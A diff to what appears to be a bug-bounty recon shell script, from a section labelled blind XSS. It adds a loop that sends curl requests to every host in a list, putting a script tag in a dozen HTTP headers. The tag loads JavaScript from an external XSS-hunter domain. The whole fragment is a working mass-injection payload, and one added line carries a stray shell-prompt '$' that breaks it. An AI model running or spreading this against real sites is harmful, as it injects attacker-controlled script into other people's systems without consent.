@@ -34,9 +34,9 @@ wc -l <  $1live.txt
 
 
 #blindxss
+$ sed -e 's/^/https:\/\//' $1live.txt > $1livehttps.txt
 
-
-while read line; do curl -sSf $line -Is  -H 'User-Agent: "><script src=https://husseinphp23.xss.ht></script>"'  -H 'X-Requested-With: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-For: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-Proto: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Correlation-ID: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-forwarded-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Client-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-real-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-request-uri: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-XSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-CSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'cf-connecting-ip: "><script src=https://husseinphp23.xss.ht></script>"' ; done < $1live.txt
+while read line; do curl -sSf $line -Is  -H 'User-Agent: "><script src=https://husseinphp23.xss.ht></script>"'  -H 'X-Requested-With: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-For: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-Proto: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Correlation-ID: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-forwarded-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Client-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-real-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-request-uri: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-XSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-CSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'cf-connecting-ip: "><script src=https://husseinphp23.xss.ht></script>"' ; done < $1livehttps.txt
 
 
 
